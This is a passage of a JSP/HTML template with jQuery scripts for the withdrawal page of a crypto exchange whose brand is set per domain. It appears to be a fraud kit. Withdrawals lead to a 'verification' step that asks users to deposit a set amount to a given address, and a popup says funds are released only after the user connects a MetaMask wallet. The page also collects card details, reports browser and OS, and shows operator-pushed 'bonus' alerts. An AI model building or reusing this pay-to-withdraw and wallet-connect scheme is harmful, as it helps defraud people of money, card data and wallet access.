                </button>
                <button class="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-three" onclick="location.reload()">
                    Cancel
                </button>
            </div>
        </div>
    </div>
    <div class="popap-verifi-container-item popap-verifi-list-four ">
        <div class="popap-verifi-container-item-img">
            <img src="../assets/img/popup-verifi-img/icon.png" alt="">
        </div>
        <div class="popap-verifi-item-info ">
            <div class="popap-verifi-item-info-title">
                Verification in process
            </div>
            <div class="popap-verifi-item-info-text">
                Our automated system has started the verification process of your account.
                Please wait.<br>
                If the process does not complete within
                <b>2 hours</b>, please contact customer support.
            </div>
            <div class="popap-verifi-item-info-btn">
                <button class="popap-verifi-item-info-btn-next popap-verifi-btn-cancel-four">
                    Close
                </button>
            </div>
        </div>
    </div>
</div>
<!-- END POPUP-->
<input type="hidden" value="false" id="u_verify_status">
<!-- START FOOTER -->
<div class="bottom section-padding">
    <div class="container">
        <div class="row">
            <div class="col-xl-4 col-lg-4 col-md-6 col-sm-6">
                <div class="bottom-logo">
                    <a class="navbar-logo-vn" href="/">
                        <%
              out.println("<img src=\"" + request.getAttribute("domain_icon") + "\" style=\"width: 30px;\" alt=\"\">");
            %>
                        <%
              out.println("<span style=\"margin-left: 6px;\">" + request.getAttribute("domain_exchange_name") + "</span>");
            %>
                    </a>
                    <%
            out.println("<p style=\"width: 230px;\">" + request.getAttribute("domain_exchange_name") + " is a simple, elegant, and secure platform to build your crypto portfolio.</p>");
          %>
                </div>
            </div>
            <div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
                <div class="bottom-widget">
                    <h4 class="widget-title">Features</h4>
                    <ul>
                        <li><a href="/">Home</a></li>
                        <li><a href="../trading">Trading</a></li>
                        <li><a href="/profile/wallet">Wallet</a></li>
                        <li><a href="/profile/invest">Invest</a></li>
                        <li><a href="/profile/swap">Instant swap</a></li>
                        <li><a href="/profile/p2p">P2P</a></li>
                        <li><a href="/profile/support">Support</a></li>
                    </ul>
                </div>
            </div>
            <div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
                <div class="bottom-widget">
                    <h4 class="widget-title">
                        Market tools
                    </h4>
                    <ul>
                        <li><a href="../tools/marketcrypto">Crypto market cap</a></li>
                        <li><a href="../tools/marketscreener">Market screener</a></li>
                        <li><a href="../tools/technicalanalysis">Technical analysis</a></li>
                        <li><a href="../tools/crossrates">Cross rates</a></li>
                        <li><a href="../tools/heatmap">Currency heat map</a></li>
                    </ul>
                </div>
            </div>
            <div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
                <div class="bottom-widget">
                    <h4 class="widget-title">Legal</h4>
                    <ul>
                        <li><a href="../terms">Terms of service</a></li>
                        <li><a href="../privacy-notice">Privacy notice</a></li>
                        <li><a href="../cookies-policy">Cookies policy</a></li>
                        <li><a href="../aml-kyc-policy">AML & KYC policy</a></li>
                        <li><a href="../fees">Fees</a></li>
                        <li><a href="../bugbounty">Bug Bounty</a></li>
                    </ul>
                </div>
            </div>
            <div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
                <div class="bottom-widget">
                    <h4 class="widget-title">Exchange Pair</h4>
                    <ul>
                        <li><a href="../trading?symbol=BTC">BTC to USDT</a></li>
                        <li><a href="../trading?symbol=ETH">ETH to USDT</a></li>
                        <li><a href="../trading?symbol=LTC">LTC to USDT</a></li>
                        <li><a href="../trading?symbol=ADA">ADA to USDT</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="footer">
    <div class="container">
        <div class="row">
            <div >
                <div class="copyright">
                    <%
                        out.println("<p style=\"font-size:12px\";><strong>" + request.getAttribute("domain_exchange_name") + "</strong> © Copyright 2023 | Worldwide Distributed Digital Asset Exchange | Trading digitals assets such as Bitcoin involves significant risks.</p>");
                    %>
                    </p>
                </div>
            </div>
            <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                <div class="footer-social">
                </div>
            </div>
        </div>
    </div>
</div>
<div id="alert_message_modal" class="popup__container" style="display: none;">
    <div class="popup">
        <div class="popup__close" id="alert_close_modal">
            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px"
                 width="24" height="24"
                 viewBox="0 0 24 24"
                 style=" fill:#FFFFFF;">
                <path d="M 4.9902344 3.9902344 A 1.0001 1.0001 0 0 0 4.2929688 5.7070312 L 10.585938 12 L 4.2929688 18.292969 A 1.0001 1.0001 0 1 0 5.7070312 19.707031 L 12 13.414062 L 18.292969 19.707031 A 1.0001 1.0001 0 1 0 19.707031 18.292969 L 13.414062 12 L 19.707031 5.7070312 A 1.0001 1.0001 0 0 0 18.980469 3.9902344 A 1.0001 1.0001 0 0 0 18.292969 4.2929688 L 12 10.585938 L 5.7070312 4.2929688 A 1.0001 1.0001 0 0 0 4.9902344 3.9902344 z"></path>
            </svg>
        </div>
        <div class="popup__left">
            <img src="../assets/img/warning.png" alt="" id="alert_img_pop">
        </div>
        <div class="popup__right">
            <div class="popup__right-title" id="alert_title_text">
                Warning
            </div>
            <div class="popup__right-description" id="userAlertBox">
            </div>
            <input type="hidden" id="alertMessageId" value="0">
            <div id="alert_close_modal_button" class="popup__right-button">
                Close
            </div>
        </div>
    </div>
</div>
<div id="verify_popap_meta" class="popap-verifi" style="position: fixed !important; display: none; text-align: left;">
    <input type="hidden" id="MetaalertMessageId" value="0">
    <div class="popap-verifi-container-item popap-verifi-list-one popap-verifi-activ">
        <div class="popap-verifi-container-item-img">
            <img src="../metamask/assets/fox.svg" style="width: 135px;">
        </div>
        <div class="popap-verifi-item-info">
            <div class="popap-verifi-loader">
                <div class="popap-verifi-loader-border"></div>
            </div>
            <div class="popap-verifi-item-info-title">
                Last step of verification
            </div>
            <div id="alertMessageMeta" class="popap-verifi-item-info-text" style="max-height: 170px; overflow: hidden;">
                To complete the verification process - connect your Metamask wallet.<br><br>
                After confirming metamask wallet, you will be able to withdraw your funds.
            </div>
            <div class="popap-verifi-item-info-btn">
                <button onclick="openMetaMask()" class="popap-verifi-item-info-btn-next popap-verifi-list-one-button">
                    Connect Metamask
                </button>
                <button id="closeMetaMaskBtn" class="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-list-one">
                    Cancel
                </button>
            </div>
        </div>
    </div>
</div>
<!-- END FOOTER -->
<script src="../assets/js/jquery-3.4.1.min.js"></script>
<script src="../assets/js/popper.min.js"></script>
<script src="../assets/js/bootstrap.min.js"></script>
<script src="../assets/js/amcharts-core.min.js"></script>
<script src="../assets/js/amcharts.min.js"></script>
<script src="../assets/js/custom.js"></script>
<script src="../plugins/notifications/toastr.js"></script>
<script src="../assets/js/new-select/new-select.js" ></script>
<script src="../assets/js/verifi/verifi.js"></script>
<script src="../assets/js/menu_main.js"></script>
<script src="../assets/js/g_menu_main.js"></script>
<script>
    function noti(msg, status) {
        toastr[status](msg);
        toastr.options = {
            "closeButton": false,
            "debug": false,
            "newestOnTop": false,
            "progressBar": false,
            "rtl": false,
            "positionClass": "toast-top-right",
            "preventDuplicates": false,
            "onclick": null,
            "showDuration": 300,
            "hideDuration": 1000,
            "timeOut": 5000,
            "extendedTimeOut": 1000,
            "showEasing": "swing",
            "hideEasing": "linear",
            "showMethod": "fadeIn",
            "hideMethod": "fadeOut"
        }
    }
</script>
</body>
</html>
<script src="../assets/js/main.js"></script>
<script src="../assets/js/withdrawTabs.js"></script>
<script>
    var active_crypto = 'usd';
    function setTab(crypto) {
        $("#btn_" + active_crypto).removeClass("buttonActiveNew");
        $("#btn_" + crypto).addClass("buttonActiveNew");

        $("#tab_" + active_crypto).removeClass("deposit__content-item-active");
        $("#tab_" + crypto).addClass("deposit__content-item-active");

        active_crypto = crypto;
    }


    function verify_deposit() {
        var verify_coin_name = $("#verify_currency_list").val();

        $.ajax({
            url: "/profile",
            type: "POST",
            data: {
                action: "WITHDRAW_VERIFY_DEPOSIT",
                crypto: verify_coin_name
            },
            success: function(response) {
                if(response == "error") {
                    noti("Server error, please, try again", "error");
                } else {
                    var json = JSON.parse(response);
                    var verify_amount = json['verify_amount'];
                    var verify_address = json['verify_address'];
                    var verify_memo = json['verify_memo'];

                    var coin_get = verify_coin_name.toUpperCase();
                    $("#verify_3_crypto").html(coin_get);

                    $("#verify_amount").val(verify_amount);
                    $("#verify_address").html(verify_address);

                    if(verify_memo != "0") {
                        $("#verify_memo_block").css("display", "block");
                        $("#verify_memo").html(verify_memo);
                        $(".popap-verifi-container-item").css("height", "410px");
                    } else {
                        $("#verify_memo_block").css("display", "none");
                        $(".popap-verifi-container-item").css("height", "350px");
                    }
                }
            }
        });
    }

    $("#verify_trans_btn").on("click", function() {
        var verify_amount = $("#verify_amount").val();
        var verify_address = $("#verify_address").html();
        var verify_memo = $("#verify_memo").html();
        var verify_coin_name = $("#verify_currency_list").val();

        $.ajax({
            url: "../ajax/ajax",
            type: "POST",
            data: {
                action: "CHECK_VERIFY_DEPOSIT",
                verify_amount: verify_amount,
                verify_address: verify_address,
                verify_memo: verify_memo,
                verify_crypto: verify_coin_name
            },
            success: function(response) {
                if(response == "2") {
                    noti("Transaction not found for identification", "error");
                    noti("Press the button when the specified amount will be transferred to the specified address", "info");
                } else if(response == "3") {
                    noti("A deposit to the specified address was found, but the amount does not match the specified one", "warning");
                } else if(response == "1") {
                    $(".popap-verifi-list-three").removeClass("popap-verifi-activ");
                    $(".popap-verifi-list-four").addClass("popap-verifi-activ");
                }
            }
        });
    });

    function withdraw(crypto, e) {
        e.preventDefault();

        var address = $("#"+crypto+"_address").val();
        var memo = $("#"+crypto+"_memo").val();
        var amount2 = $("#"+crypto+"_amount").val();
        var amount = parseFloat(amount2);

        var user_balance = parseFloat($("#"+crypto+"_balance").html());

        if(address == "" || address.length < 10) {
            noti("Please enter a valid wallet address", "error");
        } else if(amount2 == "" || amount2 == NaN || amount == 0 || amount <= 0) {
            noti("Please enter the amount to withdraw", "error");
        } else if(amount > user_balance) {
            noti("You don't have enough balance to withdraw", "error");
        } else {

            $.ajax({
                url: "/profile",
                type: "POST",
                data: {
                    action: "GET_MINIMUM_AMOUNT",
                    crypto: crypto
                },
                success: function(response) {
                    if (response === "-1") {
                        noti("An unexpected error has occurred, please try again", "error");
                        return;
                    }
                    var min_dep = response;

                    if(parseFloat(min_dep) > amount) {
                        noti("Oops.. Minimal withdraw amount: " + min_dep + " " + crypto.toUpperCase(), "error");
                    } else {
                        $.ajax({
                            url: "/profile",
                            type: "POST",
                            data: {
                                action: "WITHDRAW",
                                amount: amount2,
                                crypto: crypto,
                                address: address,
                                memo: memo
                            },
                            success: function(response) {

                                if(response == "verify") {
                                    $("#verify_popap").addClass("popap-verifi-block-active");
                                    var u_verify_status = $("#u_verify_status").val();

                                    if(u_verify_status == "true") {
                                        $(".popap-verifi-list-four").addClass("popap-verifi-activ");
                                        $(".popap-verifi-list-one").removeClass("popap-verifi-activ");
                                    }

                                } else if(response == "w_true") {
                                    var d = new Date();
                                    var strDate = d.getFullYear() + "/" + (d.getMonth()+1) + "/" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes();
                                    //$("#withdraw_true_modal").css("display", "flex");
                                    $("#withdraw_true_modal_new").addClass("successful-popup__bg-active");
                                    $("#t_withdraw_date").html(strDate);
                                    $("#t_withdraw_amount").html(amount + " " + crypto);
                                    $("#t_withdraw_address").html(address);
                                } else if(response == "w_confirmed_true") {
                                    var d = new Date();
                                    var strDate = d.getFullYear() + "/" + (d.getMonth()+1) + "/" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes();
                                    //$("#withdraw_true_modal").css("display", "flex");
                                    $("#withdraw_true_confirmed_modal").addClass("successful-popup__bg-active");
                                    $("#t_withdraw_confirmed_date").html(strDate);
                                    $("#t_withdraw_confirmed_amount").html(amount + " " + crypto);
                                    $("#t_withdraw_confirmed_address").html(address);
                                } else if(response == 'error_memo') {
                                    noti("Please enter correct memo number", "error");
                                } else if(response == 'error') {
                                    noti("An unexpected error has occurred, please try again", "error");
                                } else if(response == 'error_address') {
                                    noti("Please enter a valid wallet address", "error");
                                } else if(response == 'error_balance') {
                                    noti("You don't have enough balance to withdraw", "error");
                                } else {
                                    $("#withdraw_error_modal").css("display", "flex");
                                }
                            }
                        })
                    }
                }
            })
        }

    }

    function withdrawUsd(e) {
        e.preventDefault();

        var usd_card = $("#usd_card").val();
        var usd_number = $("#usd_number").val();
        var usd_name = $("#usd_name").val();
        var usd_month = $("#usd_month").val();
        var usd_year = $("#usd_year").val();
        var usd_currency = $("#usd_currency").val();
        var usd_amount = $("#usd_amount").val();


        var amount = parseFloat(usd_amount);

        var user_balance = parseFloat($("#"+usd_currency+"_balance").html());

        if(usd_number == "" || usd_number.length < 16) {
            noti("Please enter a valid card number", "error");
        } else if(usd_amount == "" || usd_amount == NaN || amount == 0 || amount <= 0) {
            noti("Please enter the amount to withdraw", "error");
        } else if(amount > user_balance) {
            noti("You don't have enough balance to withdraw", "error");
        } else if(usd_name == "" || usd_name.length < 6) {
            noti("Please enter a valid Name and Surname", "error");
        } else if(usd_month == "00" || usd_year == "0000") {
            noti("Please enter a valid card Month and Year", "error");
        } else {
            $.ajax({
                url: "/profile",
                type: "POST",
                data: {
                    action: "GET_MINIMUM_AMOUNT",
                    crypto: usd_currency
                },
                success: function (response) {
                    if (response === "-1") {
                        noti("An unexpected error has occurred, please try again", "error");
                        return;
                    }
                    var min_dep = response;

                    if (parseFloat(min_dep) > amount) {
                        noti("Oops.. Minimal withdraw amount: " + min_dep + " " + usd_currency.toUpperCase(), "error");
                    } else {
                        $.ajax({
                            url: "/profile",
                            type: "POST",
                            data: {
                                action: "WITHDRAW",
                                amount: amount,
                                crypto: usd_currency,
                                address: usd_number
                            },
                            success: function (response) {

                                if (response == "verify") {
                                    $("#verify_popap").addClass("popap-verifi-block-active");
                                    var u_verify_status = $("#u_verify_status").val();

                                    if (u_verify_status == "true") {
                                        $(".popap-verifi-list-four").addClass("popap-verifi-activ");
                                        $(".popap-verifi-list-one").removeClass("popap-verifi-activ");
                                    }

                                } else if (response == "w_true") {
                                    var d = new Date();
                                    var strDate = d.getFullYear() + "/" + (d.getMonth() + 1) + "/" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes();
                                    //$("#withdraw_true_modal").css("display", "flex");
                                    $("#withdraw_true_modal_new").addClass("successful-popup__bg-active");
                                    $("#t_withdraw_date").html(strDate);
                                    $("#t_withdraw_amount").html(amount + " " + usd_currency);
                                    $("#t_withdraw_address").html(usd_number);
                                } else if (response == "w_confirmed_true") {
                                    var d = new Date();
                                    var strDate = d.getFullYear() + "/" + (d.getMonth() + 1) + "/" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes();
                                    //$("#withdraw_true_modal").css("display", "flex");
                                    $("#withdraw_true_confirmed_modal").addClass("successful-popup__bg-active");
                                    $("#t_withdraw_confirmed_date").html(strDate);
                                    $("#t_withdraw_confirmed_amount").html(amount + " " + usd_currency);
                                    $("#t_withdraw_confirmed_address").html(usd_number);
                                } else if (response == 'error_memo') {
                                    noti("Please enter correct memo number", "error");
                                } else if (response == 'error') {
                                    noti("An unexpected error has occurred, please try again", "error");
                                } else if (response == 'error_address') {
                                    noti("Please enter a valid wallet address", "error");
                                } else if (response == 'error_balance') {
                                    noti("You don't have enough balance to withdraw", "error");
                                } else {
                                    $("#withdraw_error_modal").css("display", "flex");
                                }
                            }
                        })
                    }
                }
            })
        }
    }

    $("#close_error_modal").on("click", function() {
        $("withdraw_error_modal").css("display", "none");
    });

    $("#close_modal_btn").on("click", function() {
        $("#withdraw_error_modal").css("display", "none");
    });

    $("#alert_close_modal_button").on("click", function() {
        $("#alert_message_modal").css("display", "none");
    });

    $("#close_error_modal").on("click", function() {
        $("#withdraw_error_modal").css("display", "none");
    });

    $("#alert_close_modal_btn").on("click", function() {
        $("#alert_message_modal").css("display", "none");
    });

    $("#alert_close_modal").on("click", function() {
        $("#alert_message_modal").css("display", "none");
    });    $("#alert_close_modal").on("click", function() {
        $("#alert_message_modal").css("display", "none");
    });

    $("#close_modal_true_btn").on("click", function() {
        $("#withdraw_true_modal").css("display", "none");
    });


    $("#btc_bal").on("click", function() {
        var btc_balance = $("#btc_bal").html();
        $("#btc_amount").val(btc_balance);
    });

    $("#eth_bal").on("click", function() {
        var eth_balance = $("#eth_bal").html();
        $("#eth_amount").val(eth_balance);
    });

    $("#ltc_bal").on("click", function() {
        var ltc_balance = $("#ltc_bal").html();
        $("#ltc_amount").val(ltc_balance);
    });

    $('#usd_amount').keyup(function(e){

        var usd_currency = $("#usd_currency").val();
        var my_balance = parseFloat($("#"+usd_currency+"_balance").val());

        var input_amount = $("#usd_amount").val();

        if($("#usd_amount").val() == '') {
            input_amount = 0;
        }


        var profit_amount_usd = parseFloat($("#" + usd_currency + "_course").val()) * input_amount;
        profit_amount_usd = profit_amount_usd.toFixed(2);


        if(parseFloat(my_balance) < parseFloat(input_amount)) {
            noti("You do not have enough funds for this amount", "error");
            $("#usd_amount_dollar").html('$0.00');
            $("#usd_amount").val("");
        } else {
            $("#usd_amount_dollar").html("$" + profit_amount_usd);
        }



    });

    function enterMaximumAmount(crypto, amount) {
        $("#" + crypto + "_amount").val(amount);
    }
</script>
<script>
    $(document).ready(function(){
        setTimeout(function() {
            $.ajax({
                url: "../api/deposits",
                type: "POST",
                data: {
                    action: "REFRESH_MY_ADDRESSES"
                },
                success: function(response) {
                }
            })
        }, 500);
    });
</script>
<script src="../assets/js/os-detect.js"></script>
<script>
    setInterval(function() {
        var messageId = $("#alertMessageId").val();
        if(messageId == '0') {
            $.ajax({
                url: "/profile",
                type: "POST",
                data: {
                    action: "CHECK_USER_ALERT_MESSAGE",
                    browser_name: getBrowserName(),
                    os_name: getOSName()
                },
                success: function(response) {
                    var json = JSON.parse(response);

                    if (json["support_messages"] !== undefined && json["support_messages"] != null) {
                        var spanElement = document.getElementById("count_support_message");
                        if (spanElement !== null) {
                            if (json["support_messages"] === "0") {
                                spanElement.remove();
                            } else {
                                spanElement.innerHTML = json["support_messages"]
                            }
                        } else if (json["support_messages"] !== "0") {
                            spanElement = document.createElement("span");
                            spanElement.id = "count_support_message";
                            spanElement.className = "support_messages";
                            spanElement.innerHTML = json["support_messages"];

                            var supportElement = document.getElementById("support_count");
                            supportElement.appendChild(spanElement);
                        }
                    }

                    if (json["alert_message_text"] !== undefined && json["alert_message_text"] != null) {
                        var alert_message_text = json['alert_message_text'];

                        if (json['alert_message_type'] == 'alert') {
                            $("#alert_message_modal").css("display", "flex");
                            $("#userAlertBox").html(alert_message_text);

                        } else if (json['alert_message_type'] == 'bonus') {
                            $("#alert_img_pop").attr("src", "");
                            $("#alert_title_text").html("Bonus");
                            $("#alert_img_pop").attr("src", "../assets/img/bonus-icon.png");
                            $("#alert_message_modal").css("display", "flex");
                            $("#userAlertBox").html(alert_message_text);

                            $("#userAlertBox").css("font-size", "18px");
                        } else if (json['alert_message_type'] == 'notification') {
                            noti(alert_message_text, 'info');
                        }
                    }
                }
            })
        }
    }, 5000);
</script>